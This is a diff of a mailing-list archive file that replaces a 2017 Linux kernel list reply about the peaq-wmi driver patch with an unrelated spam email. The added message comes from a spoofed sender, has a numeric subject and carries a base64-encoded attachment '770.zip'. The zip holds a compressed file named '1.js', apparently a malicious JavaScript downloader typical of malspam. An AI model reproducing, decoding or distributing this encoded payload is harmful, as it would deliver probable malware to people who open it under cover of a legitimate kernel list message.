@@ -1,44 +1,69 @@
-From: Darren Hart <dvhart@infradead.org>
-Subject: Re: [PATCH v3] platform/x86: peaq-wmi: Add new peaq-wmi driver
-Date: Fri, 12 May 2017 10:47:51 -0700
-Message-ID: <20170512174751.GB17235@fury>
-References: <20170512151154.8903-1-hdegoede@redhat.com>
+From: <wesley.sydnor@louisvillemsd.org>
+Subject: 54344
+Date: Sun, 14 May 2017 11:35:18 -0000
+Message-ID: <149476171839.26768.6916923641890017723@vnpt.vn>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
+Content-Type: application/zip; name="770.zip"
+Content-Transfer-Encoding: base64
 Return-path: <platform-driver-x86-owner@vger.kernel.org>
-Received: from bombadil.infradead.org ([65.50.211.133]:53544 "EHLO
-        bombadil.infradead.org" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1758088AbdELRrx (ORCPT
+Received: from static.vnpt.vn ([14.169.187.68]:58453 "HELO vnpt.vn"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751603AbdENLfY (ORCPT
         <rfc822;platform-driver-x86@vger.kernel.org>);
-        Fri, 12 May 2017 13:47:53 -0400
-Content-Disposition: inline
-In-Reply-To: <20170512151154.8903-1-hdegoede@redhat.com>
+        Sun, 14 May 2017 07:35:24 -0400
+Content-Disposition: attachment
 Sender: platform-driver-x86-owner@vger.kernel.org
 List-ID: <platform-driver-x86.vger.kernel.org>
-To: Hans de Goede <hdegoede@redhat.com>
-Cc: Andy Shevchenko <andy@infradead.org>, platform-driver-x86@vger.kernel.org, linux-kernel@vger.kernel.org
+To: platform-driver-x86@vger.kernel.org
 
-On Fri, May 12, 2017 at 05:11:54PM +0200, Hans de Goede wrote:
-> PEAQ is a new European OEM, I've bought one of their 2-in-1 x86
-> devices, which is actually quite a nice device. Under Windows it has
-> Dolby software for "better" sound and you can select different equalizer
-> presets using a special button.
-> 
-> This WMI interface for this button is not really nice, as it does not do
-> notifies (it really does not I tripple checked), but since I had already
-> figured out the entire WMI interface for this I decided to go the full
-> mile anyways and also implent a WMI based input driver for this using
-> input_polldev since, well, we need to poll.
-> 
-> This commit adds support for this button making it report KEY_SOUND input
-> events. KEY_SOUND is already used in various places to switch sound into
-> theatre mode and things like that so it seems appropriate here.
-> 
-> Signed-off-by: Hans de Goede <hdegoede@redhat.com>
-> Reviewed-by: Andy Shevchenko <andy.shevchenko@gmail.com>
-> Reviewed-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>
-
-Queued to testing, thanks.
--- 
-Darren Hart
-VMware Open Source Technology Center
+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
+56keytIBUEsFBgAAAAABAAEAVgAAANIKAAAAAA==
